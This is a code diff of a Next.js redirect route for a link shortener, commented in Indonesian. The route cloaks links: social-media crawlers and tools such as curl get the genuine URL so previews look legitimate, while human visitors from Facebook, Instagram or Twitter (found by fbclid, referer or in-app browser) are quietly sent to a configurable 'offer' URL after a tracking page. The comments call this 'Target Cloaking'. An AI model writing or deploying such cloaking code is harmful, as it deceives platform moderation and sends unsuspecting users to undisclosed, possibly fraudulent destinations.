@@ -5,10 +5,10 @@ export async function GET(
   request: Request,
   { params }: { params: Promise<{ slug: string }> }
 ) {
-  // 1. Ambil Slug (ID Link)
+  // 1. Ambil Slug
   const { slug } = await params;
 
-  // 2. Ambil URL Asli (entry) dan Settingan (settings) dari Database
+  // 2. Ambil Data Link & Settings
   const [linkResult, settingsResult] = await Promise.all([
     supabase.from('links').select('url, clicks').eq('id', slug).single(),
     supabase.from('settings').select('*').eq('id', 1).single()
@@ -17,65 +17,62 @@ export async function GET(
   const entry = linkResult.data;
   const settings = settingsResult.data;
 
-  // 3. Jika link tidak ada, lempar ke 404
+  // 3. Kalau Link Gak Ada -> 404
   if (linkResult.error || !entry) {
     const url = new URL(request.url);
     return NextResponse.redirect(new URL('/404', url.origin), { status: 302 });
   }
 
-  // --- LOGIKA HITUNG PENGUNJUNG ---
-  const newCount = (entry.clicks || 0) + 1;
-  supabase.from('links').update({ clicks: newCount }).eq('id', slug).then();
-
-  // --- CONFIG DARI DATABASE (Pengganti JSON lu) ---
+  // --- SETTINGAN ---
   const OFFER_URL = settings?.offer_url || "";
-  const IS_OFFER_ACTIVE = settings?.offer_active || false; // Ambil status ON/OFF dari DB
+  const IS_OFFER_ACTIVE = settings?.offer_active || false;
   const HISTATS_ID = settings?.histats_id || "0";
   const DELAY_MS = settings?.delay_ms || 2000;
   const SITE_NAME = settings?.site_name || "Loading...";
 
-  // --- LOGIKA DETEKSI (PERSIS KODE LU) ---
-  // --- LOGIKA DETEKSI UPDATE (SUPAYA BISA TANPA FBCLID) ---
+  // --- DETEKSI PENGUNJUNG ---
   const urlObj = new URL(request.url);
-  const searchParams = urlObj.searchParams;
+  const userAgent = (request.headers.get('user-agent') || "").toLowerCase(); // Kecilkan semua huruf biar gampang dicek
   const referer = (request.headers.get('referer') || "").toLowerCase();
-  const userAgent = request.headers.get('user-agent') || "";
 
-  // 1. Cek Parameter URL (fbclid)
-  const hasFbclid = searchParams.has('fbclid');
+  // A. DETEKSI ROBOT/CRAWLER (Yg suka ngintip link buat preview gambar)
+  // Penting: "facebookexternalhit" adalah bot. "fban/fbav" adalah manusia.
+  const isBot = /facebookexternalhit|facebot|twitterbot|whatsapp|telegrambot|discordbot|googlebot|bingbot|baiduspider|curl|wget/i.test(userAgent);
 
-  // 2. Cek Referer (Datang dari domain facebook)
-  // l.facebook.com, m.facebook.com, lm.facebook.com, dll.
-  const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
+  // B. DETEKSI MANUSIA DARI FACEBOOK (Target Cloaking)
+  // 1. Cek Parameter URL
+  const hasFbclid = urlObj.searchParams.has('fbclid');
+  
+  // 2. Cek Referer (Datang dari domain facebook/instagram)
+  const isFromSocial = referer.includes('facebook') || referer.includes('fb.com') || referer.includes('instagram') || referer.includes('t.co'); // t.co = twitter
+  
+  // 3. Cek Browser Bawaan Aplikasi (In-App Browser)
+  // fban = Facebook Android, fbav = Facebook App Version, instagram = Instagram App
+  const isInAppBrowser = /fban|fbav|fb_iab|instagram|fbiossdk/i.test(userAgent);
 
-  // 3. Cek Browser Bawaan Aplikasi Facebook (In-App Browser)
-  // FBAN = Facebook for Android, FBAV = Facebook App Version, FB_IAB = Facebook In-App Browser
-  const isFbAppBrowser = /FBAN|FBAV|FB_IAB/i.test(userAgent);
+  // GABUNGAN: Apakah ini Target Kita?
+  const isTargetVisitor = hasFbclid || isFromSocial || isInAppBrowser;
 
-  // 4. Gabungkan semua sinyal Facebook
-  const isFacebookVisitor = hasFbclid || isFromFbReferer || isFbAppBrowser;
+  // --- LOGIKA REDIRECT UTAMA ---
+  
+  // KASUS 1: Kalo BOT -> Kasih Link Asli (Biar preview gambar di FB muncul bagus)
+  if (isBot) {
+    return NextResponse.redirect(entry.url, { status: 307 });
+  }
 
-  // 5. Cek Bot (Facebook Crawler/Scraper wajib dianggap bot agar preview aman)
-  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(userAgent);
+  // KASUS 2: Kalo MANUSIA -> Hitung Klik & Cek Offer
+  const newCount = (entry.clicks || 0) + 1;
+  supabase.from('links').update({ clicks: newCount }).eq('id', slug).then();
 
-  // Default Tujuan = Link Asli
+  // Tentukan Tujuan Akhir
   let finalDestination = entry.url;
 
-  // Logika Belok ke Offer
-  // JIKA: Offer Aktif DAN (Pengunjung dari FB) DAN (Bukan Robot)
-  if (IS_OFFER_ACTIVE && isFacebookVisitor && !isBot) {
+  // JIKA: Fitur Aktif DAN Pengunjung adalah Target (FB/IG) -> Belok ke Offer
+  if (IS_OFFER_ACTIVE && isTargetVisitor) {
     finalDestination = OFFER_URL;
   }
 
-  // KASUS A: Jika BOT -> Redirect Langsung ke TUJUAN AKHIR (Biar preview bener)
-  if (isBot) {
-    // Di kode lu: return NextResponse.redirect(finalDestination, { status: 307 });
-    // Kalau bot, biasanya kita mau kasih konten asli (entry.url) biar gambarnya muncul di FB.
-    // Tapi gua ikutin kode lu: redirect ke finalDestination.
-    return NextResponse.redirect(finalDestination, { status: 307 });
-  }
-
-  // KASUS B: Jika MANUSIA -> Tampilan Putih Polos + Histats (HTML PERSIS KODE LU)
+  // --- TAMPILAN UNTUK MANUSIA (Loading Putih + Histats) ---
   const htmlContent = `
     <!DOCTYPE html>
     <html lang="en">
@@ -84,12 +81,7 @@ export async function GET(
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>${SITE_NAME}</title>
       <style>
-        body {
-          background-color: #ffffff; /* Latar Putih Polos */
-          margin: 0;
-          height: 100vh;
-          overflow: hidden;
-        }
+        body { background-color: #ffffff; margin: 0; height: 100vh; overflow: hidden; }
       </style>
     </head>
     <body>
@@ -105,14 +97,12 @@ export async function GET(
         })();
       </script>
       <noscript>
-        <a href="/" target="_blank">
-          <img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0">
-        </a>
+        <img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0">
       </noscript>
 
       <script>
         setTimeout(function() {
-          window.location.href = "${finalDestination}";
+          window.location.replace("${finalDestination}");
         }, ${DELAY_MS});
       </script>
     </body>
